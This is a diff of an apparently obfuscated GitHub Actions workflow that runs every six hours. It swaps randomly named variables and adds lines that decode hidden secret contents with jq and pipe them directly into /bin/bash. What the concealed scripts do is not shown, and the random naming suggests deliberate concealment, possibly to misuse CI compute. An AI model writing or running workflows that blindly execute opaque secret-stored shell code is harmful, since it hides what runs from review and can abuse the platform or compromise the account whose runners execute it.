@@ -2,7 +2,7 @@ name: ruanxiaowu19871010
 on:
   workflow_dispatch:
   schedule:
-    - cron: '16 5/6 * * *'
+    - cron: '3 0/6 * * *'
 
 jobs:
   build:
@@ -11,22 +11,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: ruanxiaowu19871010
         env:
-          ph1: ${{ secrets.ph1 }}
+          fy70: ${{ secrets.fy70 }}
         run: |
-          echo $ph1 | jq -r .xe068 | /bin/bash
-          echo $p82139 | jq -r .q4 | /bin/bash
-          echo $c9 | jq -r .hce0 | /bin/bash
-          echo $i4 | jq -r .mehn05862 | /bin/bash
-          echo $gg60 | jq -r .neo3768 | /bin/bash
-          echo $vln698 | jq -r .xesrm69 | /bin/bash
-          echo $npk7 | jq -r .rrqks5 | /bin/bash
-          echo $apg467 | jq -r .cupl63 | /bin/bash
-          echo $xps049 | jq -r .zaw8517 | /bin/bash
-          echo $qnu33492 | jq -r .w9 | /bin/bash
-          echo $ti2 | jq -r .z73 | /bin/bash
-          echo $eq6 | jq -r .grug87 | /bin/bash
-          echo $onpk54772 | jq -r .rgyqa43 | /bin/bash
-          echo $lx1 | jq -r .izpn49029 | /bin/bash
-          echo $fsrhl35 | jq -r .wu740 | /bin/bash
-          echo $ybaac74 | jq -r .mpnjf469 | /bin/bash
+          echo $fy70 | jq -r .mear2 | /bin/bash
+          echo $eavv0964 | jq -r .sxbp353 | /bin/bash
+          echo $kptjv7761 | jq -r .z479 | /bin/bash
+          echo $hzhgd48 | jq -r .pygk19622 | /bin/bash
+          echo $tfzob1 | jq -r .sas40261 | /bin/bash
+          echo $f51503 | jq -r .kalj13 | /bin/bash
+          echo $bfee22653 | jq -r .pzu5 | /bin/bash
+          echo $vxk6353 | jq -r .h78946 | /bin/bash
+          echo $fx71 | jq -r .wr70 | /bin/bash
+          echo $jcigs02 | jq -r .loifo1 | /bin/bash
+          echo $wu5 | jq -r .sc89271 | /bin/bash
 
